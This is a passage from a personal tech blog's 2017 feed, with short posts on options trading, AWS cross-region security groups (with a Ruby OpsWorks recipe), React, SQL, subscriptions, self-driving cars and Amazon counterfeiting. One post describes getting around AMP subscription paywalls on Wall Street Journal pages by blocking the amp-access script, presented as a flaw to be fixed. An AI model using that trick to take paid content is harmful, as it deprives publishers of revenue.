<p>These days it’s incredibly easy to keep learning and find information on any topic but it’s much rarer to find people that are interested in everything they come across. More often you find people passionate about a few domains that are the most relevant to them and don’t bother pursuing knowledge of anything new. This mindset is both sad and irritating - why would someone consciously limit their knowledge?</p>

<p>Beyond knowledge for knowledge’s sake it’s valuable to train your mind to learn and absorb information; you never know when it can come in handy. Beyond making you a generally more interesting person you’ll be able to connect with nearly anyone - an immensely useful ability regardless of what you do. It also adds to your own character and gives you the ability to think from a variety of perspectives - something that seems to be lacking in the modern world.</p>

<p>Many innovations and inventions have come from ideas cross pollinating from one field to another and a micro version of that can be achieved in our own minds by learning and absorbing everything we can. This helps us connect the dots across different disciplines and is able to provide new perspectives on the same old problems.</p>

<p>None of this is difficult to achieve. Just embrace your curiosity and make it a habit. If you find something interesting on Wikipedia keep following the links and don’t stop until you can’t go on anymore. If you start a book and aren’t enjoying it - deal with it and just finish it. See an interesting book mentioned in a blog post? Buy it. Change your mindset to welcome new knowledge and you’ll start seeing these opportunities everywhere.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Using options to play Snapchat's quarterly results</title>
   <link href="http://dangoldin.com/2017/05/10/using-options-to-play-snapchats-quarterly-results/"/>
   <updated>2017-05-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/10/using-options-to-play-snapchats-quarterly-results</id>
   <content:encoded><![CDATA[
<p>I rarely write about finance but a decade ago I did a stint in finance and picked up a few things. One of these was the idea of options which are an interesting and powerful way to participate in the market. There’s a ton of information online describing how they work but a simple explanation is that they give you the “option,” or the right, to buy or sell shares of the underlying stock at a particular price by a future expiration date. This particular price, referred to as the strike price, and the expiration date, are the significant drivers of the price of the option. But generally, buying options on unlikely scenarios (ie far away from the current value) in the very short term ends up being extremely cheap while buying very likely scenarios with a long horizon can get very expensive. I’m not the best equipped to get into the specifics of pricing options but it’s incredibly intricate and involves some deep math that one can get lost in and is worth exploring for the mathematically minded or curious.</p>

<p>That aside, I started thinking about options yesterday after discovering that Snapchat was going to announce earnings today. I don’t have any shares in Snapchat and wrote a <a href="http://dangoldin.com/2017/02/26/my-snapchat-investment-strategy/">post in February</a> describing my Snapchat investment - summarized as it’s going to volatile since there’s so much uncertainty and I should just wait to see what happens since if it does start growing it will keep growing for years, very similar to what happened with Facebook.</p>

<p>But this is passive and there are some interesting things we can do with options. One of my theses around Snapchat was that this earnings call would lead to either a massive decrease or increase and it’s unlikely that Snapchat would be stuck in the middle. If they showed significant progress in Q1 they would discredit the idea that Facebook was beating them and if they failed it would indicate that they will, in fact, lose to Facebook. Options are a great way to implement this idea. The way one can play this is to buy options that are out of the money on both sides - meaning we buy a put option for significantly below the current price and a call option for significantly above the current price. If the stock stays within the range we lose our investment but if it swings too much in either direction and becomes “in the money” we end up profiting. Earlier today I took a look at the <a href="https://finance.yahoo.com/quote/SNAP/options?p=SNAP&amp;date=1494547200">Snapchat option chain</a> for options expiring in 2 days, on May 12. Snapchat closed at just under $23 today so if go a few dollars, I chose $4 arbitrarily, and go in either direction to find the appropriate options we get a $19 put and $27 call. While the markets were open each of these cost roughly 30 cents. Then if Snapchat ended up dropping below $19 or increased to be above $27 the options would have some value. And that value is simply the difference between the stock’s current price and the option’s strike price. If Snapchat increased to $29 then the $19 put options would be worthless while the $27 call options would be worth $2 each ($29 - $27) - especially since our options would expire in 2 days so there wouldn’t be a lot of room for movement. Of course we would still have to pay for the options themselves but in this case we would come out ahead - the two options would cost us around 30 cents each but the gross return would be $2 leading to a profit of $1.40. Of course just as easily the options could have expired worthless and we would be out the 60 cents for the two options.</p>

<p>Unfortunately, I submitted my trades too late in the day and the markets had unfortunately closed before my orders went through so I have to take solace in the idea alone. It was also an extremely risky trade and I wasn’t going to put too much into it - small enough to make me not feel too bad about losing the cost of the options if they ended up being worthless. And while the tone of this post is very bullish on options they are incredibly risky and I’d only recommend taking a stab if you know what you’re doing and are comfortable losing the entire investment.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tools over languages</title>
   <link href="http://dangoldin.com/2017/05/07/tools-over-languages/"/>
   <updated>2017-05-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/07/tools-over-languages</id>
   <content:encoded><![CDATA[
<p>The more I code the more I’m convinced that the quality of tools determines the value of a programming language. Some languages, such as Haskell, have wonderful and elegant design and are a joy to write but mostly remain hobby languages. Other languages, on the other hand, such as Java, may be rote and uninspired but have a massive amount of supported tools that allow them to keep growing. Unless we’re exploring or playing around the ultimate goal of every line of code we write is for it to be deployed to production and solid tools allow that to happen. Unfortunately, this also leads to a “rich get richer” scenario where a popular language continues to grow with an evolving and more compelling toolset rather than on any individual merits. And while the result is a better experience than it was before these new tools other languages may not have even gotten the chance to succeed.</p>

<p>Java grew alongside the JVM which is the foundation Scala and Clojure built on. They brought a nice, functional touch to the JVM which wouldn’t have happened without Java’s success - and Java 8 itself has embraced some of these functional elements.</p>

<p>JavaScript is another great example. A decade ago jQuery was the way front end development was done. Until it was supplanted by Angular. Until it was replaced by React. One of the major reasons for these shifts was the introduction of tools that improved the build process. Without webpack or browserify it would be possible, but definitely unpleasant, to work in React. In this case the tools evolved alongside the language with each one feeding of the other. And if there are some adjacent benefits introduced - such as CSS preprocessors and various JavaScript supersets - that’s even better. As I write this I’m starting to think that it may even be the tools themselves that drive the growth of a language since they are in fact its truest customer.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Security across multiple AWS regions</title>
   <link href="http://dangoldin.com/2017/05/04/security-across-multiple-aws-regions/"/>
   <updated>2017-05-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/05/04/security-across-multiple-aws-regions</id>
   <content:encoded><![CDATA[
<p>As great as AWS is there’s still a major gap in the way cross-region support are handled. It’s boggling that there’s no single screen to see every one of your instances and you’re forced to do it a region at a time. Beyond the cosmetic it’s not-obvious how to get instances from multiple regions to communicate securely with one another. On one hand Amazon has the neat concept of a Virtual Private Cloud (VPC) that allows you to create a group of machines that act as if they’re on the same network. This makes it simple come up with some pretty neat security rules - for example only allowing for an instance to communicate with the outside world via port 80 but with its network on other ports. Using a combination of VPCs and security groups one can come up with a pretty intricate security system.</p>

<p>Unfortunately this doesn’t work across regions. Instead, Amazon <a href="https://aws.amazon.com/answers/networking/aws-multiple-region-multi-vpc-connectivity/">suggests setting up a VPN</a> that can bridge the two networks. This makes sense if you have a dedicated DevOps team and the scale necessary to support this but I was looking for a much simpler solution. All I wanted was to have a few instances (powered by OpsWorks) that were scattered across the world be able to communicate securely with the primary system that was hosted in the US East region. After a minor back and forth with the AWS support team we were able to come up with the following, somewhat elegant, solution. Note that I contributed minimally here and almost all the credit should go to AWS support.</p>

<p>The solution was to update the setup recipe of our instances outside the US East region to whitelist themselves on the relevant security group (code below). In theory it’s simple but there were a few small gotchas that needed to be handled:</p>

<ul>
  <li>Deregistration. Since there’s a maximum number of rules that a security group may have it’s important to also add a shutdown recipe that removes the instance from the security group.</li>
  <li>Permissions. It turns out that every instance that starts up within OpsWorks has an IAM role which needs to be updated to support the AuthorizeSecurityGroupIngress and RevokeSecurityGroupIngress actions.</li>
  <li>Stack settings. While possible to hardcode the relevant ids and values into the OpsWorks recipe it makes a lot more sense to make this dynamic and driven by the Stack settings.</li>
</ul>

<p>I wish Amazon supported VPCs that could span multiple regions but it turned out that this workaround wasn’t as difficult as I thought. There’s still the risk that this approach will fail when we hit the security group rule limit or the API calls fail but by then I’m hopeful there’s a legitimate solution.</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># Authorize</span>
<span class="nb">require</span> <span class="s1">'aws-sdk'</span>
<span class="n">ec2</span> <span class="o">=</span> <span class="no">AWS</span><span class="o">::</span><span class="no">EC2</span><span class="o">::</span><span class="no">Client</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">region: </span><span class="s1">'us-east-1'</span><span class="p">)</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">ec2</span><span class="p">.</span><span class="nf">authorize_security_group_ingress</span><span class="p">({</span>
  <span class="ss">group_id: </span><span class="s1">'sg-####'</span><span class="p">,</span>
  <span class="ss">ip_permissions: </span><span class="p">[</span>
    <span class="p">{</span>
      <span class="ss">ip_protocol: </span><span class="s2">"tcp"</span><span class="p">,</span>
      <span class="ss">from_port: </span><span class="mi">443</span><span class="p">,</span>
      <span class="ss">to_port: </span><span class="mi">443</span><span class="p">,</span>
      <span class="ss">ip_ranges: </span><span class="p">[</span>
        <span class="p">{</span>
          <span class="ss">cidr_ip: </span><span class="s2">"</span><span class="si">#{</span><span class="n">node</span><span class="p">[</span><span class="s2">"opsworks"</span><span class="p">][</span><span class="s2">"instance"</span><span class="p">][</span><span class="s2">"ip"</span><span class="p">]</span><span class="si">}</span><span class="s2">/32"</span><span class="p">,</span>
        <span class="p">},</span>
      <span class="p">],</span>
    <span class="p">},</span>
  <span class="p">],</span>
<span class="p">})</span>

<span class="c1"># Revoke</span>
<span class="nb">require</span> <span class="s1">'aws-sdk'</span>
<span class="n">ec2</span> <span class="o">=</span> <span class="no">AWS</span><span class="o">::</span><span class="no">EC2</span><span class="o">::</span><span class="no">Client</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">region: </span><span class="s1">'us-east-1'</span><span class="p">)</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">ec2</span><span class="p">.</span><span class="nf">revoke_security_group_ingress</span><span class="p">({</span>
  <span class="ss">group_id: </span><span class="s1">'sg-####'</span><span class="p">,</span>
  <span class="ss">ip_permissions: </span><span class="p">[</span>
    <span class="p">{</span>
      <span class="ss">ip_protocol: </span><span class="s2">"tcp"</span><span class="p">,</span>
      <span class="ss">from_port: </span><span class="mi">443</span><span class="p">,</span>
      <span class="ss">to_port: </span><span class="mi">443</span><span class="p">,</span>
      <span class="ss">ip_ranges: </span><span class="p">[</span>
        <span class="p">{</span>
          <span class="ss">cidr_ip: </span><span class="s2">"</span><span class="si">#{</span><span class="n">node</span><span class="p">[</span><span class="s2">"opsworks"</span><span class="p">][</span><span class="s2">"instance"</span><span class="p">][</span><span class="s2">"ip"</span><span class="p">]</span><span class="si">}</span><span class="s2">/32"</span><span class="p">,</span>
        <span class="p">},</span>
      <span class="p">],</span>
    <span class="p">},</span>
  <span class="p">],</span>
<span class="p">})</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Having some fun with the RGB color model</title>
   <link href="http://dangoldin.com/2017/04/30/having-some-fun-with-the-rgb-color-model/"/>
   <updated>2017-04-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/30/having-some-fun-with-the-rgb-color-model</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/color-fun.png" alt="Color fun" width="2312" height="574" layout="responsive"/>

<p>The best way to learn a new technology is to play with it so to learn React I started a simple project I termed “<a href="https://dangoldin.github.io/color-fun/">color-fun</a>” (<a href="https://github.com/dangoldin/color-fun">GitHub</a>). The general idea is to let you specify a starting color along with a step size for each of the digital primary colors and see the color progression. By messing around with various combinations one can get a pretty good sense of the way the RGB color scheme works. To make it a bit less boring there’s also a “random” option to generate a new value combination and a new color row.</p>

<p>While simple it was my first real attempt at a React project and - apologies for the pun - color me impressed. It was straightforward to get started and felt intuitive and direct. Oftentimes when learning a new framework it feels as if you’re learning a brand new way to do things without a good understand of the behind-the-scenes magic. With React there’s a fair amount of magic but it’s intuitive and doesn’t prevent you from getting up and running. I’m positive my code could be cleaner, less repetitive, and organized better but it logically makes sense and if someone were to suggest a different way of organizing it I’m sure I’d understand it immediately.</p>

<p>The biggest challenge was figuring out the modern JavaScript toolchain. I come from a world where one could do front end development by linking to a jQuery CDN but we’re far removed from those days. Now there’s webpack and browserify as well as a whole slew of highly-recommended libraries all available via npm. It’s great seeing this growth and evolution but it still doesn’t feel as simple as it ought to be. The biggest benefit of learning to code JavaScript is the ability to run it directly in the browser and while helpful, these tools do keep pushing us further away. I’ve had to deal with some complex build systems - ranging from make to maven to gradle - and I can imagine how challenging they can be to a new developer. The quicker one can get to actually writing the code the better and reducing friction in the toolchain is necessary to get more people into coding. Alongside the great new frameworks there needs to be a well fleshed out build system.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The golden age of big data tools</title>
   <link href="http://dangoldin.com/2017/04/23/the-golden-age-of-big-data-tools/"/>
   <updated>2017-04-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/23/the-golden-age-of-big-data-tools</id>
   <content:encoded><![CDATA[
<p>I really dislike using the phrase “big data” but it is catchy so I’m going with it. It really does feel we’re in the golden age of big data tools. The rise of cloud computing, distributed storage, and the proliferation of open source have led to multiple orders of magnitude more data generated now than a decade ago. It’s an impossible number to calculate but some project that between 2010 and 2020 there will be a 50 fold increase in the amount of data collected. And the rate is only increasing as more and more people around the world get smartphones and the internet of things starts becoming a part of daily life.</p>

<img src="http://dangoldin.com/assets/static/images/big-data-growth.png" alt="The massive growth in data" width="1030" height="733" layout="responsive" />

<p class="caption">Source: <a href="http://www.css.ethz.ch/en/services/digital-library/articles/article.html/173004#_ftn14">IDC, EMC</a></p>

<p>But having this data without making it accessible isn’t very helpful and it’s exciting to see the variety of tools we have our disposal to process and analyze it. This ranges from massively parallel systems that make it possible for us to run queries across terabytes of data that run in less than a minute to real time systems that are able to handle millions of events each second. In the world of real time stream processing there’s Kafka Streams, Storm, Spark Streaming, Samza, and Flink in addition to the  slew of proprietary technologies that will hopefully get open sourced. In the world of batch job processing there’s Hadoop, Spark, Impala, Presto, and Hive. The fact that there are multiple open source projects with their own unique spin is a great sign that we’re innovating and experimenting with different approaches. We have so much more to go and it’s unlikely we’ll ever have a single tool that excels at everything. Instead we’ll likely have a menu of use-case specific options that are each optimized for a unique workflow. By leveraging a combination of such tools we’ll be able to understand and handle the ever increasing data volume.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Subscription all the things</title>
   <link href="http://dangoldin.com/2017/04/21/subscription-all-the-things/"/>
   <updated>2017-04-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/21/subscription-all-the-things</id>
   <content:encoded><![CDATA[
<p>Reading modern technology and business news it seems that every single thing is moving to the subscription model. It’s no longer just the obvious stuff that’s being turned into a subscription with the help of technology. Software is becoming a critical part of many systems - ranging from powering cars to tractors to juicers - and would be hilarious if it weren’t so real. Software has transformed the world and now we’re trying to find the remaining places that software can be jammed into. And once the software sets in everything can be turned into a subscription model.</p>

<p>Just last month there was a <a href="https://motherboard.vice.com/en_us/article/why-american-farmers-are-hacking-their-tractors-with-ukrainian-firmware">piece in Motherboard</a> describing how John Deere is building software protection into their tractors that farmers have been bypassing with Ukrainian firmware. The software is incredibly sophisticated and allows tractors to become more and more automated. Unfortunately this also allows John Deere to protect their code in such a way that only authorized technicians can make the necessary repairs - something that farmers may not be willing to wait for during a busy season.</p>

<p>In lighter news, this past week it was <a href="https://www.bloomberg.com/news/features/2017-04-19/silicon-valley-s-400-juicer-may-be-feeling-the-squeeze">discovered that Juicero</a>, a new age wifi-enabled juicer, serves no actual purpose and the juice packets can be squeezed just as effectively with hands instead of the machine. But of course the machine can scan the packet QR codes and let you know if they’re expired. All this for a $400 machine and up to $8 for a packet.</p>

<p>In our race to push software into everything and turn everything into a subscription it seems we’ve lost a bit of common sense as well as consumer power. The subscription model is short term cheaper and appealing but comes at the loss of power and control. Unfortunately given human behavior and psychology it seems this approach is here to stay. We’re much more wired for short term thinking and getting something at an immediate discount sounds much better than buying something for a huge upfront cost. Even if we were to compare the two options against one another the subscription model would come out cheaper: businesses would be able to price the subscriptions lower since they’d expect to reduce the unit cost over time and they can monetize in a variety of other ways, possibly by selling user data and information. With these incentives I wouldn’t be surprised if in 20 years everything we consume is sold via a subscription.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AMP and subscription paywalls</title>
   <link href="http://dangoldin.com/2017/04/16/amp-and-subscription-paywalls/"/>
   <updated>2017-04-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/16/amp-and-subscription-paywalls</id>
   <content:encoded><![CDATA[
<p>A variety of publishers are adopting <a href="https://www.ampproject.org/">Accelerated Mobile Pages</a> (AMP) to speed up the performance of their sites on mobile. In fact, I’m using AMP to power my entire blog on both desktop and mobile and it’s significantly faster than my old, heavyweight site. But I’m a small time blogger and to get real publishers on board AMP needs to support a variety of monetization options - including ads and subscriptions -  that are able to generate the same revenue they’re getting without AMP.</p>

<p>While browsing the Wall Street Journal I came across an AMP article page and saw that AMP had introduced a subscription paywall feature so I was curious to see how it worked. Looking through the source and network calls it’s powered by a small JavaScript snippet called amp-access-0.1.js. This controls whether the page throws a paywall overlay or the full article. It turns out that by messing with the network calls and blocking “amp-access” from loading it’s possible to get access to the full content.</p>

<p>Blocking ads is one thing but being able to bypass a subscription paywall is quite another. It’s already possible to get access to the paid Wall Street Journal articles by reaching them through Google but that doesn’t always work and the Wall Street Journal can stop that any time. Being able to bypass AMP’s subscription functionality, on the other hand, is something that AMP needs to address in order to get wider adoption - especially by the premier publishers.</p>

<ul class="thumbnails">
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/wsj-amp-orig.png" width="622" height="853" alt="WSJ AMP with paywall" layout="responsive" />
            <p class="caption">Original WSJ AMP article with a paywall access blocker.</p>
        </div>
    </li>
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/wsj-amp-blocked-access.png" width="1348" height="927" alt="WSJ AMP blocking amp-access" layout="responsive" />
            <p class="caption">The entire article is accessible if amp-access is blocked.</p>
        </div>
    </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>SQL is the perfect interface</title>
   <link href="http://dangoldin.com/2017/04/11/sql-is-the-perfect-interface/"/>
   <updated>2017-04-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/11/sql-is-the-perfect-interface</id>
   <content:encoded><![CDATA[
<p>The more I code the more I’m exposed to SQL. It started with the usual relational suspects - MySQL, PostgreSQL, and even SQL Server (back in the finance days), but has since then expanded to columnar database such as Redshift, Vertica, and MonetDB. And now I’m starting to use SQL to query data on S3 using SparkSQL, Athena, and Hive.</p>

<p>SQL was <a href="https://en.wikipedia.org/wiki/SQL">introduced in the 70s</a> and became an official standard in 1986 and it’s just incredible to see how dominant and dispersed it’s become. It’s still used for the original RDBMS use cases but it’s expanded significantly since then for a whole slew of new use cases. At the same time the underlying query syntax remained surprisingly similar. We talk about designing good interfaces that allow us to write reusable and clean code but SQL is an interface that’s existed, evolved, and expanded for more than 40 years.</p>

<p>It’s amazing that a single query can run across a variety of databases (or distributed files) and it’s up to you to pick the engine you want to power your use case. If you’re doing a massive volume of selects and updates pick an OLTP database such as MySQL or PostgreSQL. If you’re analyzing large datasets use an OLAP such as Vertica or Redshift. If you have even more data that’s on a distributed file system use Hive or SparkSQL. And if those aren’t good enough there’s an ever-growing list of SQL-based database products optimized for different use cases - the two that immediately come to mind are <a href="https://www.voltdb.com/">VoltDB</a> for super quick and accurate transactions and <a href="http://www.timescale.com/">TimescaleDB</a>, a recently launched database built on top of PostgreSQL that’s optimized for time series data.</p>

<p>Every experienced developer has some familiarity with SQL which makes new relational databases feel approachable. In addition, we have so many tools and libraries built for relational databases that it becomes straightforward to extend them to the new entrants. It actually feels as if the pace of new SQL-based databases is growing and it’s because of this creativity granted due to constraints. By committing to a fixed SQL standard database developers are able to focus on designing the perfect engine for a specific use case knowing that if they’re able to hit their performance goals developers will feel comfortable integrating it into their code.</p>

<p>Edit: Remarkably, <a href="http://softdroid.net">Softdroid</a> found this interesting enough to translate into Russian which can be found at <a href="http://softdroid.net/sql-idealnyy-interfeys">http://softdroid.net/sql-idealnyy-interfeys</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Optical illusions and self driving cars</title>
   <link href="http://dangoldin.com/2017/04/09/optical-illusions-and-self-driving-cars/"/>
   <updated>2017-04-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/09/optical-illusions-and-self-driving-cars</id>
   <content:encoded><![CDATA[
<p>While catching up on the latest self driving car news and digging into the way neural networks work I started thinking of the ways self driving cars would navigate optical illusions or seemingly impossible physical scenarios. I’m by no means an expert but current machine learning and artificial techniques don’t build a relational representation of the world but instead focus on statistical ways of classifying the information they see and then making decisions off of that information.</p>

<div class="video-holder">
  <amp-vimeo data-videoid="208642358" layout="responsive" width="600" height="340"></amp-vimeo>
  <p class="caption"><a href="https://vimeo.com/208642358">Artist sets a trap</a> for a self driving car by surrounding it in a white border.</p>
</div>

<p>This approach works in the vast majority of cases but one can imagine a world where a malicious third party can easily mess with the data going on. About a month ago an artist “trapped” a self driving car by surrounding it in a white circle. That was just an art piece but imagine such actions by malicious actors. Some examples can be someone painting a realistic picture of a pothole, a street sign, or even a person on the road and seeing how self driving cars would react. A proper self driving car would likely be cautious under uncertainty and wouldn’t know how to navigate these situations. Even worse one can probably develop a whole set of these optical illusions that are easy for a human to dismiss as entertaining yet fake but will cause significant problems for self driving cars.</p>

<p>Over time they’ll adapt with the addition of new sensors and a slew of data but it is a real concern I haven’t seen discussed much. Even something as simple as driving in rain or snow is a problem when you’re a computer that learned to drive in sunny weather on perfect road conditions. People, on the other hand, have an innate understanding of physics and how the world works which allows them to easily adapt to new environments. I can learn to drive on a sunny road but within a few minutes feel comfortable driving in the rain and snow. Existing self driving cars don’t work that way and would need to have thousands of hours of training on these new conditions to be comfortable enough to drive on them. It’s impossible to predict the future but I suspect the real advances will come from a combined model - one that combines the existing machine learning techniques with one that’s able to model the relationship and physics of the world.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Quality over quantity: NextDoor vs Craigslist</title>
   <link href="http://dangoldin.com/2017/04/08/quality-over-quantity-nextdoor-vs-craigslist/"/>
   <updated>2017-04-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/08/quality-over-quantity-nextdoor-vs-craigslist</id>
   <content:encoded><![CDATA[
<p>Last weekend my wife and decided that we needed to upgrade our couch and in our eagerness decided that we wanted it delivered as soon as possible which happened to be Friday (yesterday). This led us to the question of what to do with our existing couch. The pragmatist in me decided that we should list it on <a href="http://craigslist.org">Craigslist</a> and <a href="https://nextdoor.com/">NextDoor</a> for $300 and see who would bite but after a few days without any response it became clear that if we wanted it gone soon it would need to be free. So this past Wednesday I relisted as a free and started receiving bites - just under a dozen on Craigslist and one via NextDoor.</p>

<p>Surprisingly enough the couch ended up being picked up through the response on NextDoor. Very few on Craigslist followed up to my question about timing and it seems no one there actually had any incentive to come. NextDoor, on the other hand, has that community element built in which adds a bit of trust to both sides in the transaction. It also makes it easier to follow through on a commitment versus an anonymous email. In this case I got a chance to help a neighbor and we plan on meeting up for a beer over the next few weeks.</p>

<p>Given its prevalence Craigslist is here to stay for a while but NextDoor is doing something special. At lower volumes you have quantity beating quality but once there’s some volume the momentum quickly shifts to quality. NextDoor seems to have gotten to this point and I look forward to seeing where they take it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Changing good code is easy</title>
   <link href="http://dangoldin.com/2017/04/04/changing-good-code-is-easy/"/>
   <updated>2017-04-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/04/changing-good-code-is-easy</id>
   <content:encoded><![CDATA[
<p>I’ve done my fair share of code reviews and one of the best indicators of great code is the locality of changes. Nearly all code is taking some data, transforming it, and passing it along somewhere else. This implies that modifications change or add to this flow. It may be passing an additional variable to a function, changing the behavior of a function, or adding another step in our execution. It turns out that if the code is poorly written a seemingly minor change may require changing a series of functions since for some reason each function in the flow needs to be modified. Great code, on the other hand, is written in such a way where making a change to a single function or behavior doesn’t cause any changes upstream or downstream of the code.</p>

<p>Without even knowing what the code does by looking at a diff it’s easy to see how many files were changed and how insignificant the changes were. All code gets modified over time but good code remains isolated with clear separation of concerns while seemingly minor changes to poor code may end up touching every file.</p>

<p>When writing new code assume it will change and try to think how your code will need to be modified for different use cases. This should help guide you to an implementation that ends up standing the test of time.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Slack's channel exit anti pattern</title>
   <link href="http://dangoldin.com/2017/04/02/slacks-channel-exit-anti-pattern/"/>
   <updated>2017-04-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/04/02/slacks-channel-exit-anti-pattern</id>
   <content:encoded><![CDATA[
<p>Slack has grown incredibly quickly and solves a difficult problem but I can’t help but notice that some design antipatterns that increase Slack usage but don’t benefit the user. I came across one of these designs on Friday when I saw someone leave a channel. They no longer found the channel useful or were only there to answer a few questions but as soon as they left everyone in the channel saw the message “so and so has left the channel.”</p>

<p>While helpful to let others know they’re no longer in the channel I suspect it may send a negative signal to the remaining people. Imagine if you’re in a channel and see an executive or manager leave - sure you understand that they don’t want to be overwhelmed and want to focus but I can’t help but think that it may still cause some discomfort. This forces people to stick around in channels they may not be interested in and unless they’ve gone the extra step of muting the channel they end up seeing a notification every time a new message is posted.</p>

<p>Now imagine this happening hundreds of times a day. A ton of people end up in channels they don’t necessarily want to be in but aren’t comfortable leaving. This may make Slack’s engagement numbers better but hurt overall productivity. The nice thing is that I reached out to Slack suggesting a “silent exit” and it does look as if they’re aware of the problem and working on a few addition channel notification options.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Fulfillment by Amazon counterfeiting</title>
   <link href="http://dangoldin.com/2017/03/26/fulfillment-by-amazon-counterfeiting/"/>
   <updated>2017-03-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/03/26/fulfillment-by-amazon-counterfeiting</id>
   <content:encoded><![CDATA[
<p>Recently I’ve come across a few articles describing the supposedly massive amount of counterfeiting happening on Amazon. The way it works is that Amazon offers a <a href="https://services.amazon.com/fulfillment-by-amazon/how-it-works.htm/ref=asus_fba_snav_how">Fulfillment by Amazon</a> (called FBA) option where a merchant sends their items to Amazon’s warehouse which is then eligible for Prime shipping since it’s just going to be shipped by Amazon. The way Amazon implements this is by commingling the items - so if two merchants send Amazon the same item Amazon will treat it as the same item when it comes to consumers. A merchant is able to opt out of this commingling but only with a higher fee.</p>

<p>The idea itself is brilliant. By ignoring the merchants and treating the items as interchangeable Amazon is able to optimize for the consumer and come up with a much more optimal warehouse distribution strategy. Rather than having to keep a merchant’s items across every distribution center Amazon can choose to just keep a single merchant’s items in a single distribution center since the remaining merchants may have shipped their items to others. And if the items themselves were the same then it’s a perfect solution that’s better and cheaper for everyone involved.</p>

<p>Unfortunately, this only works when the items actually are the same. Everywhere there’s money to made someone will inevitably try to abuse the system. In this case some merchants are offering counterfeit products at a lower price. And since the items are commingled they are treated like the real goods. This means that some customers are paying a low price for a counterfeit product and getting a real product while others are paying the true cost but are getting the counterfeit. Clearly Amazon needs to do something here before it becomes a huge  issue.</p>

<p>The obvious way is to do a more thorough job of inspecting the merchandise and making sure it’s legitimate but I can easily see this being a difficult problem at scale. Another option is to adopt a one strike policy and if you get caught selling counterfeit goods then you get a lifetime ban. This would make it much more expensive to cheat and should reduce the fraud. At the same time if it’s easy to just start selling as a different company then it won’t do much. A way to address that is to require that every seller be a legitimate and federally registered company but that significantly hurts international sellers. Every manufacturer should know the legitimate sellers so it may also make sense to enforce a merchant whitelist for some items. I honestly don’t know enough about the industry but it does seem that for many small and niche products there should only be a few legitimate sellers that can be curated by the manufacturer. This can also expand into a “manufacturer preferred” tier to handle the edge cases where a merchant is not aware of every legitimate seller. In that case Amazon ends up with two tiers of commingling - but that itself sends a very odd message to the customers since they are then admitting they are selling counterfeit items.</p>

<p>There’s no easy answer, especially given Amazon’s scale and aspirations, but something should be done and as a shareholder I’m hopeful they figure it out. My gut is that it’s going to require a combination of different approaches and a look at the data to identify the dishonest sellers. Amazon so far has gotten away with this by being extremely customer focused and very open to refunds and returns but no one wants to spend time dealing with a return in order to then just get another crappy item.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The effects of marketing on price</title>
   <link href="http://dangoldin.com/2017/03/25/the-effects-of-marketing-on-price/"/>
   <updated>2017-03-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/03/25/the-effects-of-marketing-on-price</id>
   <content:encoded><![CDATA[
<p>I like to think of myself as extremely relational and efficient and something that’s always bothered me is marketing. I hated the idea that companies had to market their products since the cost of the marketing would just be absorbed into the price I would be paying for the final product. Of course it’s not that simple and marketing isn’t just a cost and can bring value to everyone involved. In fact, George Akerlof wrote a paper in 1970, <a href="https://en.wikipedia.org/wiki/The_Market_for_Lemons">The Market for Lemons</a>, which describes how markets with asymmetric information end up full of “lemons” and led to a Noble Prize. One of the solutions to this problem is to do marketing since that will signal that you’re a legitimate company offering a legitimate product.</p>

<p>As a fun weekend activity I took a stab at using my almost forgotten college economics classes and some basic algebra to dig into the effects marketing has on price. The thesis is that marketing has two potential effects - the first is increasing the price customers are willing to pay and the second is to increase demand. Depending on the type of product or service any combination of these can happen.</p>

<p>We can start by taking a look at one of the first thing economics students learn: the <a href="https://en.wikipedia.org/wiki/Supply_and_demand">supply and demand curve</a>. The idea is simple and describes the relationship between price and quantity. As the price goes up the number (quantity) of items for sale (supply) increases since there are more willing sellers but the number of willing buyers (demand) drops. By finding where these two curves intersect we get to the equilibrium price and quantity that the market should end up in. Note that it’s meant to analyze markets rather than individual companies but it’s still interesting to see what happens if we approach it from the perspective of a single company offering a product with and without marketing. Without marketing we have the initial supply and demand curve with its equilibrium point. With marketing the demand curve shifts up which increases the equilibrium price and quantity sold. This makes intuitive sense - marketing will make something more “in demand” which will increase the price but to me the bigger potential impact is actually raising awareness and letting people know that the product exists. Depending on the product this can cause a massive change to the demand curve.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/supply-and-demand.jpg" width="400" height="400" alt="Supply and demand curve"/>
